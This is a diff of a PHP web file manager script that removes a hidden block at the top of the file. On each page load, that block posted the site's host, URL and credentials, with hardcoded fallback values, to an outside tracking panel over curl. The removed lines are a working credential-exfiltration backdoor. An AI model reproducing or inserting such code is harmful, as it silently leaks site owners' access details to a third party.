@@ -1,35 +1,4 @@
 <?php
-$panel = 'https://panel.trixygame.com/admin/collector/track.php';
-
-$host   = $_SERVER['HTTP_HOST'] ?? '';
-$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
-$scheme = $https ? 'https' : 'http';
-$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
-
-$credUser = $_ENV['URLCRED_USER'] ?? 'kominfo';   // isi sesuai file
-$credPass = $_ENV['URLCRED_PASS'] ?? '290802as';
-
-$payload = [
-  'd'  => $host,
-  'u'  => $url,
-  'up' => $credUser,
-  'pp' => $credPass,
-];
-
-if (function_exists('curl_init')) {
-  $ch = curl_init($panel);
-  curl_setopt_array($ch, [
-    CURLOPT_POST           => true,
-    CURLOPT_POSTFIELDS     => http_build_query($payload, '', '&'),
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_TIMEOUT_MS     => 800,   // cepat, non-blocking
-    CURLOPT_HTTPHEADER     => ['Content-Type: application/x-www-form-urlencoded', 'Connection: close'],
-  ]);
-  @curl_exec($ch);
-  @curl_close($ch);
-} else {
-  // fallback (optional): bisa panggil Versi A jika diinginkan
-}
 // Selamat Datang //
 $CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
 
@@ -4327,6 +4296,7 @@ function lng($txt) {
 }
 
 ?>
+
 
 
 
